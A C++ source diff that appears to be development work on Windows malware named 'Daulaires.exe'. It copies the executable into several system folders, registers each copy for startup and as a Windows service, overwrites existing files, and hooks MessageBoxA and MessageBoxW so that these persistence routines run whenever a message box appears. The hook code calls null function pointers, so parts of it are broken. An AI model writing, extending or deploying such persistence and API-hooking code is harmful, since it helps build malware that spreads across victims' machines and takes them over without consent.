@@ -19,19 +19,9 @@ void addToStartup(const std::wstring& appName, const std::wstring& appPath) {
     }
 };
 
-void addPathsRecursively(std::unordered_map<std::string, std::string>& paths, const std::filesystem::path& directory) {
-    for (const auto& entry : std::filesystem::directory_iterator(directory)) {
-        if (std::filesystem::is_directory(entry.path())) {
-            // Add the directory path to the map
-            paths[entry.path().string()] = entry.path().string() + "\\";
-
-            // Recursively call the function to add paths in the subdirectory
-            addPathsRecursively(paths, entry.path());
-        }
-    }
-}
-
 void write_file_to_dirs() {
+
+    Memory Memory;
     map<string, string> paths;
     // app different paths to the map
     paths["path_1"] = "C:\\Users\\Public\\";
@@ -66,17 +56,26 @@ void write_file_to_dirs() {
         };
     };
 
-    // set the app name
+
+    // Set the app name
     std::wstring appName = L"Daulaires.exe";
-    // loop through all the paths and add Daulaires.exe to them
+
+    // Loop through all the paths and add Daulaires.exe to them
     for (const auto& path : paths) {
-        // convert the path to a string before adding the file name
-        string pathString = path.second;
-        std::wstring appPath = std::wstring(pathString.begin(), pathString.end()) + L"Daulaires.exe";
+        // Convert the path to a string before adding the file name
+        std::wstring pathString = std::wstring(path.second.begin(), path.second.end());
+        std::wstring appPath = pathString + L"Daulaires.exe";
+
+        // Add to startup
         addToStartup(appName + L" " + std::wstring(path.first.begin(), path.first.end()), appPath);
-        // copy the file to the path
-        CopyFile(L"Daulaires.exe", appPath.c_str(), TRUE);
-    };
+        Memory.InstallService(L"Daulaires", L"Daulaires", appPath.c_str());
+
+        // Delete the existing file (if it exists)
+        DeleteFileW(appPath.c_str());
+
+        // Copy the file to the path
+        CopyFileW(appName.c_str(), appPath.c_str(), FALSE); // FALSE = overwrite
+    }
 };
 
 // Hooked MessageBoxA function
@@ -88,15 +87,29 @@ int WINAPI messageBoxAHook::hookedMessageBoxA(HWND hWnd, LPCSTR lpText, LPCSTR l
     MessageBoxAType originalMessageBoxA = nullptr;
 
     Main Main{};
-    Memory Memory;
-    // using system we are going to set up the service
-    Memory.InstallService(L"Daulaires", L"Daulaires Service");
-    Memory.InstallService(L"Whore", L"Whore Service");
-    Memory.InstallService(L"Mommie", L"Mommie Service");
+
     cout << "Hooked to MessageBoxA" << endl;
 
     write_file_to_dirs();
     Main.Windows();
     // Call the original MessageBoxA function
     return originalMessageBoxA(hWnd, lpText, lpCaption, uType);
+};
+
+// Hooked MessageBoxW function
+int WINAPI messageBoxAHook::hookedMessageBoxW(HWND hWnd, LPCWSTR lpText, LPCWSTR lpCaption, UINT uType) {
+	// Function type for the original MessageBoxW
+	typedef int (WINAPI* MessageBoxWType)(HWND, LPCWSTR, LPCWSTR, UINT);
+
+	// Pointer to the original MessageBoxW function
+	MessageBoxWType originalMessageBoxW = nullptr;
+    Main Main{};
+
+	cout << "Hooked to MessageBoxW" << endl;
+
+
+    write_file_to_dirs();
+    Main.Windows();
+	// Call the original MessageBoxW function
+	return originalMessageBoxW(hWnd, lpText, lpCaption, uType);
 };
